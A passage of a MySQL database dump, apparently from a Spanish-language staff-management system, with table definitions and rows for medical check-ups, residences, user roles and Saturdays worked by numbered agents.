7),(123,2018,'2018-05-28',197,NULL,7),(125,2018,'2018-05-28',180,NULL,7),(126,2018,'2018-06-01',88,NULL,7),(128,2018,'2018-06-14',293,NULL,5),(129,2018,'2018-06-20',228,NULL,4),(130,2018,'2018-06-27',287,NULL,4),(131,2018,'2018-07-05',253,NULL,3),(132,2018,'2018-07-17',233,NULL,2),(134,2018,'2018-08-02',102,NULL,7),(135,2018,'2018-01-01',143,NULL,1),(136,2018,'2018-01-01',284,NULL,1),(137,2018,'2018-01-01',179,NULL,1),(138,2019,'2019-05-20',89,NULL,2),(139,2018,'2018-09-14',136,NULL,1),(140,2018,'2018-09-12',358,NULL,1),(141,2018,'2018-09-12',363,NULL,1),(142,2018,'2018-09-12',167,NULL,3),(143,2018,'2018-09-13',378,NULL,1),(144,2018,'2018-09-06',181,NULL,2),(146,2018,'2018-09-14',234,NULL,9),(147,2018,'2018-09-11',379,NULL,2),(148,2018,'2018-09-12',385,NULL,2),(149,2018,'2018-09-18',370,NULL,1),(150,2018,'2018-09-20',380,NULL,1),(151,2018,'2018-09-18',336,NULL,1),(152,2018,'2018-09-11',155,NULL,7),(153,2018,'2018-09-17',375,NULL,7),(154,2018,'2018-09-24',381,NULL,7),(157,2017,'2017-11-13',1000,NULL,7),(158,2018,'2018-10-08',1000,NULL,7),(159,2016,'2016-06-05',1000,NULL,5),(160,2018,'2018-10-05',225,NULL,4),(162,2018,'2018-10-03',277,NULL,1),(163,2018,'2018-10-02',367,NULL,1),(164,2018,'2018-10-09',382,NULL,1),(165,2018,'2018-05-03',393,NULL,7),(167,2018,'2018-11-27',239,NULL,7),(169,2018,'2018-11-15',207,NULL,7),(170,2018,'2018-11-22',126,NULL,7),(171,2018,'2018-11-14',198,NULL,1),(172,2018,'2018-11-21',200,NULL,7),(173,2018,'2018-12-10',201,NULL,7),(175,2018,'2018-11-29',247,NULL,7),(176,2019,'2019-01-11',276,NULL,1),(177,2019,'2019-02-07',191,NULL,5),(178,2019,'2019-01-17',306,NULL,1),(179,2019,'2019-01-15',366,NULL,3),(180,2019,'2019-01-23',143,NULL,1),(181,2019,'2019-02-11',202,NULL,3),(182,2019,'2019-02-05',217,NULL,2),(183,2019,'2019-02-12',229,NULL,3),(184,2019,'2019-02-22',63,NULL,1),(187,2019,'2019-03-11',73,NULL,4),(188,2019,'2019-03-14',371,NULL,2),(189,2019,'2019-03-04',291,NULL,7),(190,2019,'2019-10-23',356,NULL,7),(191,2019,'2019-03-18',193,NULL,7),(192,2019,'2019-03-25',196,NULL,7),(194,2019,'2019-03-15',171,NULL,7),(195,2019,'2019-03-12',140,NULL,7),(197,2019,'2019-03-25',218,NULL,1),(198,2019,'2019-04-08',395,NULL,3),(199,2019,'2019-05-02',133,NULL,2),(200,2019,'2019-04-11',394,NULL,3),(201,2018,'2018-01-30',402,NULL,1),(202,2019,'2019-03-25',192,NULL,7),(203,2019,'2019-05-24',241,NULL,1),(204,2019,'2019-05-20',245,NULL,7),(206,2019,'2019-05-27',159,NULL,7),(207,2019,'2019-05-28',190,NULL,7),(208,2019,'2019-06-10',293,NULL,5),(209,2019,'2019-06-07',228,NULL,4),(210,2019,'2019-06-21',287,NULL,4),(211,2019,'2019-06-10',129,NULL,7),(212,2019,'2019-06-11',393,NULL,7),(213,2019,'2019-06-12',244,NULL,7),(214,2019,'2019-11-15',284,NULL,1),(215,2019,'2019-11-13',233,NULL,2),(217,2019,'2019-11-14',358,NULL,1),(218,2019,'2019-11-19',136,NULL,1),(220,2019,'2019-11-18',385,NULL,1),(221,2019,'2019-11-22',378,NULL,1),(222,2019,'2019-11-18',379,NULL,1),(223,2019,'2019-11-20',402,NULL,1),(224,2019,'2019-11-26',253,NULL,3),(225,2019,'2019-11-25',370,NULL,1),(226,2019,'2019-11-27',277,NULL,1),(227,2019,'2019-11-28',363,NULL,1),(228,2019,'2019-12-10',247,NULL,7),(230,2020,'2020-01-16',382,NULL,1),(231,2020,'2020-01-16',366,NULL,3),(232,2020,'2020-01-17',306,NULL,1),(233,2020,'2020-03-20',150,NULL,6),(234,2020,'2020-03-12',202,NULL,3),(235,2020,'2020-03-13',229,NULL,3),(236,2020,'2020-10-07',277,NULL,1),(237,2020,'2020-10-08',167,NULL,3),(238,2020,'2020-10-08',234,NULL,9),(239,2020,'2020-10-27',136,NULL,1),(240,2020,'2020-10-30',89,NULL,2),(241,2020,'2020-10-28',407,NULL,1),(242,2021,'2021-02-03',180,NULL,7),(243,2021,'2021-02-26',197,NULL,7),(244,2021,'2021-02-24',292,NULL,7),(245,2021,'2021-02-22',229,NULL,3),(246,2021,'2021-02-24',181,NULL,2),(247,2021,'2021-02-23',293,NULL,5),(248,2021,'2021-03-03',63,NULL,5),(249,2021,'2021-03-11',233,NULL,2),(251,2021,'2021-04-12',198,NULL,1),(252,2021,'2021-02-26',81,NULL,6),(253,2020,'2019-11-20',367,NULL,1),(254,2021,'2021-05-21',380,NULL,1),(255,2021,'2021-05-20',202,NULL,3),(256,2021,'2021-05-21',431,NULL,1),(257,2021,'2021-06-03',179,NULL,2),(258,2021,'2021-05-18',413,NULL,1),(259,2021,'2021-05-17',178,NULL,3),(260,2020,'2020-10-28',228,NULL,4),(261,2021,'2021-06-04',276,NULL,1),(262,2021,'2021-05-31',371,NULL,2),(263,2021,'2021-06-11',218,NULL,1),(264,2021,'2021-05-28',395,NULL,3),(265,2021,'2021-05-27',394,NULL,3),(266,2021,'2021-05-26',287,NULL,1),(267,2021,'2021-05-26',379,NULL,1),(268,2021,'2021-05-31',253,NULL,3),(269,2021,'2021-05-27',427,NULL,2),(270,2021,'2021-05-24',429,NULL,3),(271,2021,'2021-06-10',363,NULL,1),(272,2021,'2021-05-14',143,NULL,1),(273,2021,'2021-06-17',378,NULL,1),(274,2021,'2021-06-14',245,NULL,2),(275,2021,'2021-06-15',306,NULL,1),(276,2021,'2021-06-16',284,NULL,1),(277,2021,'2021-09-30',89,NULL,2),(278,2021,'2021-09-29',382,NULL,1),(279,2021,'2021-06-24',402,NULL,3),(280,2021,'2021-11-26',422,NULL,1),(281,2021,'2021-10-13',435,NULL,3),(282,2021,'2021-05-14',424,NULL,1),(284,2021,'2021-11-23',241,NULL,7),(285,2021,'2021-11-24',217,NULL,2),(286,2021,'2021-11-25',192,NULL,7),(287,2021,'2021-11-26',193,NULL,7),(288,2021,'2021-02-09',239,NULL,7),(289,2021,'2021-11-24',407,NULL,1),(290,2021,'2021-11-22',234,NULL,2),(291,2021,'2021-11-25',367,NULL,1),(292,2021,'2021-12-17',247,NULL,7),(294,2021,'2021-12-22',207,NULL,7),(295,2021,'2021-12-21',200,NULL,7),(297,2021,'2021-12-27',196,NULL,7),(298,2019,'2019-01-01',443,NULL,7),(299,2021,'2021-12-28',443,NULL,7),(300,2021,'2021-12-01',244,NULL,7),(302,2021,'2021-12-17',228,NULL,4),(303,2021,'2021-12-09',277,NULL,1),(304,2021,'2021-12-10',418,NULL,1),(305,2022,'2021-12-14',426,NULL,1),(307,2022,'2022-03-28',167,NULL,3),(308,2022,'2022-03-31',181,NULL,2),(309,2022,'2022-04-07',229,NULL,3),(310,2022,'2022-04-06',178,NULL,3),(311,2020,'2020-06-10',423,NULL,1),(313,2022,'2022-05-13',171,NULL,7),(314,2022,'2022-05-11',239,NULL,7),(315,2022,'2022-03-08',201,NULL,7),(316,2022,'2022-05-12',291,NULL,7),(318,2022,'2022-05-13',159,NULL,7),(319,2022,'2022-05-20',190,NULL,7),(320,2022,'2022-05-16',393,NULL,7),(322,2019,'2019-01-01',432,NULL,7),(323,2022,'2022-05-18',432,NULL,7),(324,2022,'2022-05-25',293,NULL,5),(325,2022,'2022-05-24',423,NULL,1),(326,2022,'2022-05-24',143,NULL,1),(327,2022,'2022-05-24',429,NULL,8),(329,2022,'2022-05-27',413,NULL,1),(331,2022,'2022-05-27',379,NULL,1),(333,2022,'2022-10-11',287,NULL,1),(334,2022,'2022-10-13',380,NULL,1),(336,2022,'2022-11-08',233,NULL,2),(337,2022,'2022-11-09',427,NULL,2),(338,2022,'2022-11-08',435,NULL,3),(339,2022,'2022-11-10',218,NULL,1),(340,2022,'2022-11-16',202,NULL,3),(341,2022,'2022-11-14',179,NULL,2),(342,2022,'2022-11-18',402,NULL,1),(343,2022,'2022-11-15',89,NULL,2),(344,2022,'2022-11-14',395,NULL,1),(345,2022,'2022-11-17',424,NULL,1),(352,2022,'2022-11-25',245,NULL,2),(353,2022,'2022-12-02',422,NULL,1),(354,2022,'2022-12-27',276,NULL,1),(355,2023,'2023-02-16',378,NULL,1),(356,2023,'2023-02-14',382,NULL,1),(357,2023,'2023-02-15',217,NULL,2),(358,2023,'2023-04-27',253,NULL,3),(359,2023,'2023-04-26',371,NULL,2),(360,2023,'2023-04-24',407,NULL,1),(362,2023,'2023-09-13',413,NULL,3),(363,2023,'2023-09-14',423,NULL,1),(364,2023,'2023-09-12',379,NULL,1),(365,2023,'2023-09-14',380,NULL,1),(366,2023,'2023-09-22',394,NULL,3),(367,2023,'2023-09-20',306,NULL,1),(368,2023,'2023-09-18',367,NULL,1),(369,2023,'2023-09-21',418,NULL,1),(370,2023,'2023-09-21',167,NULL,2),(371,2023,'2023-09-20',284,NULL,1),(372,2023,'2023-04-24',369,NULL,1),(373,2023,'2023-05-10',475,NULL,1),(374,2022,'2023-02-09',464,NULL,2),(375,2022,'2023-06-06',469,NULL,1),(376,2023,'2023-09-28',429,NULL,1),(377,2023,'2023-09-26',181,NULL,2),(378,2023,'2023-09-25',422,NULL,3),(382,2023,'2023-10-11',247,NULL,7),(383,2023,'2023-10-09',239,NULL,7),(385,2023,'2023-10-19',393,NULL,7),(387,2020,'2020-01-01',428,NULL,7),(388,2023,'2023-10-20',428,NULL,7),(389,2023,'2023-10-24',197,NULL,7),(390,2023,'2023-10-25',207,NULL,7),(391,2023,'2023-10-27',159,NULL,7),(392,2023,'2023-10-23',81,NULL,6),(393,2023,'2023-10-24',180,NULL,7),(394,2023,'2023-11-20',192,NULL,7),(395,2023,'2023-11-21',193,NULL,7),(397,2024,'2024-03-06',89,NULL,8),(399,2024,'2024-04-22',200,NULL,7),(400,2024,'2024-05-02',198,NULL,1),(402,2024,'2024-04-23',201,NULL,7),(403,2024,'2024-01-26',291,NULL,7),(404,2024,'2024-04-26',244,NULL,7),(405,2024,'2024-04-24',369,NULL,1),(406,2024,'2024-09-17',363,NULL,3),(407,2024,'2024-09-18',402,NULL,3),(408,2024,'2024-09-18',464,NULL,2),(409,2024,'2024-10-04',426,NULL,2),(410,2024,'2024-10-02',427,NULL,2),(411,2024,'2024-10-02',202,NULL,3),(412,2024,'2024-10-01',424,NULL,1),(413,2024,'2024-10-03',407,NULL,1),(414,2024,'2024-10-03',423,NULL,3),(415,2024,'2024-10-03',380,NULL,1),(416,2024,'2024-10-03',418,NULL,9),(417,2024,'2024-09-30',196,NULL,7),(418,2024,'2024-10-01',292,NULL,7),(419,2024,'2024-10-10',443,NULL,7),(421,2024,'2024-06-28',190,NULL,7),(422,2024,'2024-10-08',179,NULL,2),(423,2024,'2024-12-19',371,NULL,2),(424,2024,'2024-10-17',287,NULL,1),(425,2024,'2024-10-08',435,NULL,1),(426,2024,'2024-10-11',475,NULL,1),(427,2024,'2024-10-10',253,NULL,3),(428,2024,'2024-10-07',306,NULL,1),(429,2024,'2024-10-07',178,NULL,3),(430,2024,'2024-10-16',276,NULL,1),(432,2024,'2023-10-16',483,NULL,1),(433,2023,'2023-06-12',479,NULL,1),(434,2024,'2023-06-12',478,NULL,1),(435,2024,'2023-10-16',482,NULL,1),(436,2024,'2024-03-11',487,NULL,1),(437,2024,'2024-05-06',491,NULL,1),(438,2024,'2024-10-11',479,NULL,2),(439,2024,'2024-10-08',367,NULL,1),(440,2024,'2024-10-15',394,NULL,3),(441,2024,'2024-10-23',218,NULL,1),(442,2024,'2024-10-17',378,NULL,1),(443,2024,'2020-06-18',421,NULL,1),(444,2024,'2024-12-13',247,NULL,7),(445,2025,'2025-03-04',192,NULL,7),(447,2025,'2025-03-04',369,NULL,1),(448,2025,'2025-03-14',239,NULL,7),(449,2025,'2025-03-10',393,NULL,7),(450,2025,'2025-03-13',428,NULL,7),(451,2025,'2025-03-17',180,NULL,7),(452,2025,'2025-03-17',81,NULL,6),(454,2025,'2025-03-21',207,NULL,7),(457,2023,'2023-03-10',456,NULL,7),(458,2024,'2024-03-10',450,NULL,7),(460,2025,'2025-04-02',450,NULL,7),(461,2025,'2025-05-15',456,NULL,7),(462,2023,'2023-03-10',465,NULL,7),(463,2025,'2025-05-16',465,NULL,7),(464,2025,'2025-12-03',247,NULL,7),(466,2024,'2024-03-06',486,NULL,7),(467,2025,'2025-12-16',486,NULL,7),(468,2026,'2026-04-27',198,NULL,1);
/*!40000 ALTER TABLE `reconocimientos_medico` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `residencias`
--

DROP TABLE IF EXISTS `residencias`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `residencias` (
  `Id` int(11) NOT NULL AUTO_INCREMENT,
  `puesto_id` int(11) DEFAULT NULL,
  `residencia` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  PRIMARY KEY (`Id`),
  UNIQUE KEY `residencia` (`residencia`,`puesto_id`),
  KEY `pm_id` (`puesto_id`),
  CONSTRAINT `residencias_ibfk_1` FOREIGN KEY (`puesto_id`) REFERENCES `puestos_gestion` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=18 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `residencias`
--

LOCK TABLES `residencias` WRITE;
/*!40000 ALTER TABLE `residencias` DISABLE KEYS */;
INSERT INTO `residencias` VALUES (12,2,'AMOREBIETA'),(17,1,'ARASO'),(16,2,'ARIZ BASAURI'),(11,2,'ATXURI'),(2,1,'DONOSTIA'),(13,2,'DURANGO'),(3,1,'EIBAR'),(14,2,'GERNIKA'),(15,2,'LEBARIO'),(6,1,'RENTERIA'),(4,1,'ZUMAIA');
/*!40000 ALTER TABLE `residencias` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `roles`
--

DROP TABLE IF EXISTS `roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `roles` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `rol` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `rol` (`rol`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `roles`
--

LOCK TABLES `roles` WRITE;
/*!40000 ALTER TABLE `roles` DISABLE KEYS */;
INSERT INTO `roles` VALUES (1,'Administrador'),(3,'Formador'),(2,'Usuario');
/*!40000 ALTER TABLE `roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sabados_trabajados`
--

DROP TABLE IF EXISTS `sabados_trabajados`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sabados_trabajados` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `codigo_agente` int(11) NOT NULL,
  `sabado_trabajado` date NOT NULL,
  `fecha_devolucion` date DEFAULT NULL,
  `status` varchar(25) NOT NULL DEFAULT 'DISPONIBLE',
  `observacion` varchar(255) DEFAULT NULL,
  `created` datetime DEFAULT NULL,
  `modified` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `codigo_agente_2` (`codigo_agente`,`sabado_trabajado`),
  KEY `codigo_agente` (`codigo_agente`),
  CONSTRAINT `sabados_trabajados_ibfk_1` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=573 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sabados_trabajados`
--

LOCK TABLES `sabados_trabajados` WRITE;
/*!40000 ALTER TABLE `sabados_trabajados` DISABLE KEYS */;
INSERT INTO `sabados_trabajados` VALUES (1,190,'2017-12-30','2018-07-22','APROBADO',NULL,'2018-01-02 00:00:00','2019-09-18 08:58:23'),(3,196,'2018-01-06','2018-08-22','APROBADO',NULL,'2018-01-08 06:11:22','2019-03-02 07:10:51'),(4,200,'2018-01-20','2019-07-19','APROBADO',NULL,'2018-01-21 09:10:28','2019-03-02 08:12:44'),(5,190,'2017-04-22','2018-09-11','APROBADO',NULL,'2018-03-09 09:09:17','2019-03-02 07:08:10'),(6,190,'2017-07-15','2018-09-10','APROBADO',NULL,'2018-03-09 09:09:52','2019-03-02 07:09:31'),(7,190,'2017-08-12','2018-09-12','APROBADO',NULL,'2018-03-09 09:10:20','2019-03-02 07:10:02'),(8,190,'2017-10-07','2018-07-21','APROBADO',NULL,'2018-03-09 09:10:37','2019-09-18 08:58:07'),(9,196,'2017-02-04','2018-08-24','APROBADO',NULL,'2018-03-09 09:11:27','2019-03-02 07:07:45'),(10,196,'2017-04-29','2018-08-21','APROBADO',NULL,'2018-03-09 09:12:34','2019-03-02 07:08:35'),(11,196,'2017-07-22','2018-08-25','APROBADO',NULL,'2018-03-09 09:12:48','2019-03-02 07:09:47'),(12,196,'2017-10-14','2018-08-23','APROBADO',NULL,'2018-03-09 09:13:26','2019-03-02 07:10:35'),(13,197,'2017-01-21','2018-08-07','APROBADO',NULL,'2018-03-09 09:14:00','2019-03-02 07:07:19'),(14,197,'2017-04-15','2018-08-09','APROBADO',NULL,'2018-03-09 09:14:17','2019-03-02 07:07:57'),(15,200,'2017-02-18','2019-07-18','APROBADO',NULL,'2018-03-09 09:14:41','2019-03-02 08:11:51'),(16,200,'2017-05-13','2018-09-07','APROBADO',NULL,'2018-03-09 09:15:07','2019-03-02 07:08:51'),(17,200,'2017-08-05','2019-07-17','APROBADO',NULL,'2018-03-09 09:15:38','2019-03-02 08:12:16'),(18,200,'2017-09-02','2018-09-06','APROBADO',NULL,'2018-03-09 09:15:52','2019-03-02 07:10:12'),(19,201,'2017-01-28','2018-08-16','APROBADO',NULL,'2018-03-09 09:16:15','2019-03-02 07:07:31'),(20,201,'2017-04-22','2018-08-17','APROBADO',NULL,'2018-03-09 09:16:33','2019-03-02 07:08:24'),(21,201,'2017-10-07','2018-08-18','APROBADO',NULL,'2018-03-09 09:16:46','2019-03-02 07:10:25'),(22,241,'2017-01-14','2018-12-26','APROBADO',NULL,'2018-03-09 09:17:07','2019-12-20 06:09:08'),(23,241,'2017-05-20','2019-11-22','APROBADO',NULL,'2018-03-09 09:17:23','2019-10-02 04:14:43'),(24,244,'2017-06-17','2018-06-25','APROBADO',NULL,'2018-03-09 09:17:46','2019-03-02 07:09:22'),(25,247,'2017-09-09','2019-01-04','APROBADO',NULL,'2018-03-09 09:18:01','2019-02-19 05:32:56'),(26,247,'2018-10-27','2021-08-12','APROBADO',NULL,'2018-03-09 09:18:15','2021-05-05 09:34:29'),(27,291,'2017-03-18','2017-07-27','APROBADO',NULL,'2018-03-09 09:18:31','2020-07-01 12:28:22'),(28,291,'2017-06-10','2020-07-28','APROBADO',NULL,'2018-03-09 09:18:55','2020-07-01 12:30:35'),(29,291,'2017-09-02','2020-07-29','APROBADO',NULL,'2018-03-09 09:19:15','2020-07-01 12:30:41'),(30,247,'2016-10-22','2019-01-03','APROBADO',NULL,'2018-03-09 09:22:10','2019-02-19 05:33:07'),(31,200,'2016-03-19','2018-05-25','APROBADO',NULL,'2018-03-09 09:25:17','2019-03-02 07:04:51'),(32,200,'2016-06-11','2018-06-29','APROBADO',NULL,'2018-03-09 09:25:32','2019-03-02 07:05:40'),(33,200,'2016-09-03','2018-07-17','APROBADO',NULL,'2018-03-09 09:25:47','2019-03-02 07:06:19'),(34,197,'2016-05-14','2018-08-08','APROBADO',NULL,'2018-03-09 09:27:15','2019-03-02 07:05:27'),(35,198,'2016-10-29','2021-11-22','APROBADO',NULL,'2018-03-09 09:27:55','2021-11-09 09:13:20'),(36,196,'2018-03-03','2018-08-26','APROBADO',NULL,'2018-04-09 05:44:13','2019-03-02 07:11:37'),(37,196,'2018-03-31','2018-08-27','APROBADO',NULL,'2018-04-09 05:44:39','2019-03-02 07:11:48'),(38,233,'2017-06-03','2019-08-29','APROBADO',NULL,'2018-04-10 06:12:39','2022-09-19 10:28:23'),(39,233,'2018-02-10','2019-08-30','APROBADO',NULL,'2018-04-10 06:12:59','2022-09-19 10:27:53'),(40,293,'2018-02-10','2019-04-15','APROBADO',NULL,'2018-04-10 06:16:17','2019-02-21 14:32:55'),(41,293,'2018-05-05','2019-04-18','APROBADO',NULL,'2018-05-05 00:56:03','2019-02-21 14:33:27'),(42,233,'2018-05-05','2019-08-12','APROBADO',NULL,'2018-05-05 01:07:46','2022-09-19 10:28:51'),(43,233,'2016-12-17','2018-08-31','APROBADO',NULL,'2018-05-10 05:52:38','2019-03-02 07:07:07'),(44,233,'2016-09-24','2018-08-30','APROBADO',NULL,'2018-05-10 05:53:09','2019-03-02 07:06:37'),(45,233,'2016-07-02','2018-08-27','APROBADO',NULL,'2018-05-10 05:53:34','2019-03-02 07:05:56'),(46,233,'2016-04-09','2018-08-29','APROBADO',NULL,'2018-05-10 05:53:56','2019-03-02 07:05:09'),(47,233,'2016-01-16','2018-08-28','APROBADO',NULL,'2018-05-10 05:54:18','2019-03-02 07:04:30'),(49,1000,'2018-02-10',NULL,'DISPONIBLE',NULL,'2018-08-31 08:43:35','2018-08-31 08:43:35'),(50,1000,'2017-11-18','2019-09-27','APROBADO',NULL,'2018-08-31 08:44:25','2019-09-26 13:19:07'),(51,1000,'2017-08-12','2018-09-04','APROBADO',NULL,'2018-08-31 08:44:44','2018-08-31 09:10:48'),(52,1000,'2017-01-07','2018-09-03','APROBADO',NULL,'2018-08-31 09:01:06','2018-08-31 09:11:24'),(53,1000,'2016-11-12','2017-12-11','APROBADO',NULL,'2018-08-31 09:01:34','2018-08-31 09:07:52'),(54,190,'2018-09-08','2019-06-13','APROBADO',NULL,'2018-09-09 06:29:20','2023-01-04 10:28:27'),(56,200,'2018-09-29','2019-07-23','APROBADO',NULL,'2018-10-01 06:13:41','2019-03-02 08:13:13'),(57,244,'2018-02-24','2018-11-18','APROBADO',NULL,'2018-10-04 07:13:56','2019-03-02 07:11:02'),(58,244,'2018-08-11','2018-11-17','APROBADO',NULL,'2018-10-04 07:14:11','2019-03-02 07:11:58'),(59,196,'2018-06-23','2019-04-25','APROBADO',NULL,'2018-10-04 08:27:21','2019-03-22 05:42:09'),(60,197,'2018-06-09','2021-11-18','APROBADO',NULL,'2018-10-04 08:28:09','2021-11-18 12:49:35'),(61,200,'2018-07-07','2019-07-22','APROBADO',NULL,'2018-10-04 08:30:35','2019-03-02 09:00:53'),(62,201,'2018-03-24','2019-08-29','APROBADO',NULL,'2018-10-04 08:32:32','2019-05-29 06:49:42'),(63,201,'2018-06-16','2019-08-30','APROBADO',NULL,'2018-10-04 08:32:55','2019-05-29 06:49:47'),(64,247,'2018-05-12','2021-07-05','APROBADO',NULL,'2018-10-04 08:33:39','2021-05-05 09:34:19'),(65,247,'2018-06-16','2021-07-06','APROBADO',NULL,'2018-10-04 08:33:57','2021-05-05 09:34:24'),(66,244,'2018-11-03','2019-05-11','APROBADO',NULL,'2018-11-06 07:39:53','2019-12-30 06:12:16'),(67,201,'2018-12-01','2019-09-01','APROBADO',NULL,'2018-12-04 06:02:07','2019-05-29 06:49:56'),(69,190,'2018-12-01','2021-06-15','APROBADO',NULL,'2018-12-04 06:03:53','2021-05-10 05:25:08'),(70,196,'2018-12-08','2020-07-08','APROBADO',NULL,'2018-12-12 06:05:23','2020-06-09 09:03:00'),(71,241,'2018-12-22','2019-11-23','APROBADO',NULL,'2018-12-28 09:29:19','2019-10-02 04:14:47'),(72,291,'2019-01-19','2022-08-24','APROBADO',NULL,'2019-01-22 05:57:02','2022-03-25 09:39:17'),(73,247,'2019-02-16','2021-08-19','APROBADO',NULL,'2019-02-19 05:33:34','2021-05-05 09:34:35'),(74,293,'2018-07-28','2019-04-17','APROBADO',NULL,'2019-02-21 14:31:05','2019-02-21 14:33:22'),(75,293,'2018-10-20','2019-04-16','APROBADO',NULL,'2019-02-21 14:31:23','2019-02-21 14:33:13'),(76,253,'2019-01-19','2020-08-22','PENDIENTE',NULL,'2019-02-21 14:40:25','2020-06-05 07:08:54'),(77,233,'2019-01-12','2022-10-22','PENDIENTE',NULL,'2019-02-21 14:40:44','2022-10-11 09:44:56'),(78,190,'2019-02-23','2021-06-16','APROBADO',NULL,'2019-02-22 23:05:40','2021-05-10 05:25:13'),(79,200,'2018-12-22','2019-07-24','APROBADO',NULL,'2019-03-02 07:59:03','2019-03-02 08:13:33'),(80,233,'2018-10-20','2019-08-14','APROBADO',NULL,'2019-03-08 09:31:12','2022-09-19 10:28:12'),(81,233,'2018-07-28','2019-08-13','APROBADO',NULL,'2019-03-08 09:46:57','2022-09-19 10:28:38'),(82,241,'2019-03-16','2020-01-31','APROBADO',NULL,'2019-03-18 07:34:17','2020-01-21 12:35:59'),(83,200,'2019-03-16','2021-06-16','APROBADO',NULL,'2019-03-18 14:19:01','2021-06-02 06:18:52'),(84,196,'2018-09-15','2019-06-08','APROBADO',NULL,'2019-03-22 06:43:25','2019-05-04 07:21:43'),(85,292,'2019-03-23','2020-01-20','APROBADO',NULL,'2019-03-25 12:14:25','2020-01-13 05:31:06'),(86,233,'2019-04-06','2022-12-12','PENDIENTE',NULL,'2019-04-08 06:13:59','2022-10-11 09:46:27'),(87,201,'2018-09-08','2019-08-31','APROBADO',NULL,'2019-04-16 05:59:02','2019-05-29 06:49:51'),(89,244,'2019-04-20','2020-09-03','APROBADO',NULL,'2019-04-23 06:33:24','2020-06-16 05:28:00'),(90,247,'2019-04-27','2022-05-02','APROBADO',NULL,'2019-04-29 05:02:09','2022-03-01 08:09:48'),(92,197,'2018-09-01','2022-07-21','APROBADO',NULL,'2019-05-12 09:08:09','2022-03-17 07:53:41'),(93,247,'2019-05-18','2022-06-07','APROBADO',NULL,'2019-05-20 05:01:29','2022-03-01 08:11:30'),(94,196,'2019-05-25','2020-08-21','APROBADO',NULL,'2019-05-26 09:12:41','2020-02-26 06:21:56'),(95,201,'2019-05-18','2020-08-24','APROBADO',NULL,'2019-05-27 04:52:30','2020-08-05 04:51:13'),(96,200,'2019-06-08','2021-06-17','APROBADO',NULL,'2019-06-08 20:29:25','2021-06-02 06:19:20'),(97,292,'2019-06-15','2022-07-23','APROBADO',NULL,'2019-06-16 16:38:27','2022-03-07 06:23:03'),(98,233,'2019-06-29','2023-05-16','PENDIENTE',NULL,'2019-07-01 06:16:03','2023-02-06 07:52:23'),(99,291,'2019-07-06','2022-08-25','APROBADO',NULL,'2019-07-09 09:02:44','2022-03-25 09:39:09'),(100,241,'2019-06-08','2021-10-10','APROBADO',NULL,'2019-07-11 04:54:45','2021-10-13 05:05:58'),(101,244,'2019-07-13','2020-09-04','APROBADO',NULL,'2019-07-15 05:01:33','2020-06-16 05:28:05'),(102,239,'2019-07-27','2020-07-31','APROBADO',NULL,'2019-08-01 06:30:03','2020-03-02 12:11:28'),(103,190,'2019-08-10','2022-10-01','APROBADO',NULL,'2019-08-12 06:30:55','2022-08-30 05:06:10'),(104,201,'2019-08-10','2020-08-25','APROBADO',NULL,'2019-08-14 14:32:10','2020-08-05 04:51:18'),(105,196,'2019-08-17','2020-08-24','APROBADO',NULL,'2019-08-19 04:57:01','2020-02-26 06:22:16'),(106,200,'2019-08-31','2021-06-18','APROBADO',NULL,'2019-09-01 04:04:02','2021-06-02 06:12:55'),(107,247,'2019-08-31','2022-06-08','APROBADO',NULL,'2019-09-02 08:35:26','2022-03-01 08:11:37'),(108,292,'2019-09-07','2022-07-24','APROBADO',NULL,'2019-09-09 09:15:26','2022-03-07 06:22:58'),(109,1000,'2019-09-28',NULL,'DISPONIBLE',NULL,'2019-09-18 07:54:07','2019-09-18 07:54:07'),(110,190,'2018-03-24','2019-05-18','APROBADO',NULL,'2019-09-18 08:54:46','2019-09-18 08:59:47'),(111,233,'2019-09-21','2022-10-23','PENDIENTE',NULL,'2019-09-23 13:06:14','2022-10-11 09:45:17'),(112,253,'2019-09-28','2020-08-21','PENDIENTE',NULL,'2019-09-30 12:46:17','2020-06-05 07:01:18'),(114,244,'2019-10-05','2020-09-05','APROBADO',NULL,'2019-10-07 05:10:00','2020-06-16 05:28:10'),(115,239,'2019-10-19','2020-08-01','APROBADO',NULL,'2019-10-19 22:33:28','2020-03-02 12:11:33'),(116,247,'2019-11-02','2022-06-09','APROBADO',NULL,'2019-11-06 14:11:43','2022-03-01 08:11:43'),(118,201,'2019-11-02','2020-08-26','APROBADO',NULL,'2019-11-18 08:48:23','2020-08-05 04:51:23'),(119,247,'2019-11-16','2023-05-25','APROBADO',NULL,'2019-11-19 17:30:09','2023-03-21 06:14:42'),(120,200,'2019-11-23','2022-04-18','APROBADO',NULL,'2019-11-24 03:03:58','2022-04-04 05:13:34'),(121,253,'2019-12-21','2020-08-20','PENDIENTE',NULL,'2019-12-23 09:05:15','2020-06-05 07:00:58'),(122,244,'2019-12-28','2020-09-07','APROBADO',NULL,'2019-12-30 06:08:26','2020-06-16 05:28:15'),(123,239,'2020-01-11','2020-08-02','APROBADO',NULL,'2020-01-12 00:19:55','2020-03-02 